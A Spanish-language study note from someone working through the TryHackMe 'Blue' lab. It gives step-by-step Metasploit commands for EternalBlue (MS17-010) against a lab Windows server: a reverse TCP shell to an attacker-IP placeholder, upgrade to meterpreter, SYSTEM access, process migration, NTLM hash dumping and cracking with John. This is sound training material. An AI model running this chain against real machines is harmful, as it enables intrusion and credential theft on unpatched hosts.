# Blue (EternalBlue / MS17-010)

- **Link:** THM — Blue — módulo Exploitation Basics
- **Fecha:** 2026-10-05
- **Dificultad:** Easy
- **Target:** Windows Server 2012 R2 Datacenter 9600 x64

## Conceptos clave
- **MS17-010 / EternalBlue:** vuln de SMBv1 en Windows (RCE a nivel kernel). La misma que usó WannaCry (2017). Corre como SYSTEM directamente.
- La máquina **no responde a ping (ICMP)** → usar `-Pn` en nmap.
- EternalBlue es **inestable**: suele necesitar 2-3 reintentos; puede colgar el SMB (445 pasa a filtered) y requerir reboot de la VM.

## Task 1 — Recon
- Scan: `nmap -sV -Pn <IP>` (o `--script vuln` para que sugiera la vuln).
- Puertos abiertos < 1000: **3** (nmap muestra 445 entre ellos).
- Vulnerable a: **ms17-010**.

## Task 2 — Gain Access (Metasploit)
- `msfconsole` → `search ms17-010`.
- Exploit path: **`exploit/windows/smb/ms17_010_eternalblue`**.
- `show options` → valor requerido vacío = **RHOSTS** (la víctima).
- Payload que pide el room: `set payload windows/x64/shell/reverse_tcp`.
- `exploit` → shell de Windows.

## Task 3 — Escalate
- Backgroundear shell: `Ctrl+Z` (`y`).
- Post module: **`post/multi/manage/shell_to_meterpreter`**.
- Opción a cambiar: **SESSION** (`set session 1` → `run`).
- Entrar a la nueva: `sessions -i 2`.
- `getsystem` / `getuid` → `NT AUTHORITY\SYSTEM`. `shell` + `whoami` = `nt authority\system`.
- `ps` → buscar proceso SYSTEM estable. Usé **`spoolsv.exe` (PID 616)**.
- `migrate 616` → "Migration completed successfully". Confirmar con `getuid`.
  - Evitar migrar a lsass/services/wininit (críticos). Buenos: spoolsv, svchost SYSTEM, amazon-ssm-agent.

## Task 4 — Cracking (hashdump + John)
- En meterpreter: `hashdump` → vuelca hashes NTLM (`usuario:RID:LM:NT:::`).
- Usuario no-default: **Jon** (RID 1002; Administrator=500 y Guest=501 son default).
- Hash NT de Jon: `[REDACTADO]`.
- rockyou venía comprimido: `gunzip /usr/share/wordlists/rockyou.txt.gz` (o usar `/usr/share/eaphammer/wordlists/rockyou.txt` ya descomprimido).
- Crackeo: `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- **Resultados:** Jon=`[REDACTADO]`, Administrator=`[REDACTADO]`, Guest=vacío.
- LM hash `aad3b435b51404eeaad3b435b51404ee` = LM deshabilitado (Windows moderno solo guarda NT).

## Task 5 — Find flags!
- Leer archivos en meterpreter: **`cat`** (NO `type`/`gc`, esos son de CMD/PowerShell). Navegar: `cd C:/` con `/`, no `\` (el `\` final = continuación de línea y cuelga el prompt). Buscar: `search -f flag*.txt`.
- **Flag 1** (system root `C:\`): `[REDACTADO]`
- **Flag 2** (`C:\Windows\System32\config`, donde está el SAM): `[REDACTADO]`
- **Flag 3** (documentos del Administrator): `[REDACTADO]`
- Nota: ya éramos SYSTEM (máximo privilegio, por encima de Administrator). "Access denied" en PrintHood/NetHood/Recent = junctions especiales del sistema, no falta de permisos. Jerarquía: usuario → Administrator → SYSTEM.

## Herramientas / comandos importantes
- `nmap -p445 -Pn <IP>` para saber cuándo la VM terminó de bootear (no responde ping).
- Metasploit: `search`, `use`, `show options`, `set`, `exploit`, `sessions -l`, `sessions -i`, `getsystem`, `getuid`, `ps`, `migrate`, `hashdump`.

## Lo que me costó / errores (networking WSL)
- **LHOST por defecto = IP interna de WSL (172.28.x)** → el reverse shell no volvía ("no session created"). Fix: `set LHOST <ATTACKER_IP>` (IP de tun0 de la VPN). Mismo problema que en Moniker Link.
- Timeouts de EternalBlue: reintentar `exploit` varias veces; si 445 queda `filtered`, Terminate + re-deploy la VM (IP cambia → re-`set RHOSTS`).
- Confundí `RHOST` (singular) con `RHOSTS`. El exploit usa **RHOSTS**.
- Comando para entrar a sesión es `sessions -i <n>`, NO `meterpreter -i <n>`.

## Resumen para documentar
Blue = explotación de EternalBlue (MS17-010) con Metasploit: recon con nmap (-Pn), exploit SMBv1, upgrade a meterpreter con shell_to_meterpreter, ya se es SYSTEM, migración a spoolsv.exe para estabilidad. Sigue Task 4 (hashdump + crackeo con John).
